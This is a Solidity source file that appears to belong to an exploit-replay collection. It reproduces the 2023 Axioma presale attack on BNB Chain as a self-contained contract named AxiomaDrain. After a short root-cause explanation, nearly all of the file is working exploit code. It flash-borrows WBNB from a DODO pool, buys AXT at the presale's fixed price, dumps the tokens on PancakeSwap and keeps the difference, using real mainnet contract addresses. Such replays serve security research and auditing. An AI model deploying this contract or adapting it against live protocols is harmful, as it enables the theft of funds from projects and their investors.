// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-Axioma).
//
// The DeFiHackLabs PoC (test/Axioma_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself (`assetTo = address(this)`),
// and profit is measured on the test contract's own WBNB balance — so there
// is no standalone contract to deploy. This file is a faithful, self-contained
// copy of that inline attack (testExploit body + DPPFlashLoanCall callback +
// minimal inline interfaces — no imports so it compiles anywhere), compiled
// inside the registry forge project. Logic and constants are copied verbatim
// from test/Axioma_exp.sol.
//
// Root cause: AxiomaPresale.buyToken() sells AXT at a hardcoded fixed price
// with no market/oracle check and no cap tied to real demand. An attacker can
// flash-borrow WBNB (via a DODO DVM pool), unwrap it to native BNB, buy the
// presale's AXT allocation far below its PancakeSwap market price, immediately
// dump the AXT on the live AXT/WBNB pair for a large amount of WBNB, repay the
// flash loan, and keep the difference as profit — all within one transaction.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface WETH {
    function withdraw(uint256 wad) external;
    function transfer(address dst, uint256 wad) external returns (bool);
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
    function _BASE_TOKEN_() external returns (address);
}

interface IAxiomaPresale {
    function buyToken() external payable;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AxiomaDrain {
    address constant axt = 0xB6CF5b77B92a722bF34f6f5D6B1Fe4700908935E;
    address constant axiomaPresale = 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3;
    address constant axt_wbnb_pair = 0x6a3Fa7D2C71fd7D44BF3a2890aA257F34083c90f;
    address payable constant pancakeRouter = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant wbnb_usdt_b = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681; // dodo wbnb-usdt pool

    // step 1: flash-borrow WBNB from the DODO DVM pool. The callback drains the presale.
    function run() external {
        uint256 flashLoanAmount = 32_500_000_000_000_000_000;
        address wbnb = DVM(wbnb_usdt_b)._BASE_TOKEN_();
        DVM(wbnb_usdt_b).flashLoan(flashLoanAmount, 0, address(this), abi.encode(wbnb_usdt_b, wbnb, flashLoanAmount));
    }

    // DODO V2 flash-loan callback (DPPFlashLoanCall). The pool optimistically
    // sent out the WBNB; here the attacker unwraps it to native BNB, buys the
    // fixed-price presale, and dumps the AXT for WBNB on PancakeSwap.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        (address wbnb_usdt_b_, address wbnb, uint256 flashLoanAmount) = abi.decode(data, (address, address, uint256));

        // 1. buy — unwrap the borrowed WBNB to native BNB and buy the presale at its fixed price
        WETH(wbnb).withdraw(flashLoanAmount);
        IAxiomaPresale(axiomaPresale).buyToken{value: flashLoanAmount}();

        // 2. sale — dump the cheaply-acquired AXT into the live AXT/WBNB pair
        uint256 axtBalance = IERC20(axt).balanceOf(address(this));
        bscSwap(axt, wbnb, axtBalance);

        // 3. payback and get profit
        IERC20(wbnb).transfer(msg.sender, flashLoanAmount);
        uint256 profit = IERC20(wbnb).balanceOf(address(this));
    }

    fallback() external payable {}

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(pancakeRouter, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        IUniswapV2Router(pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
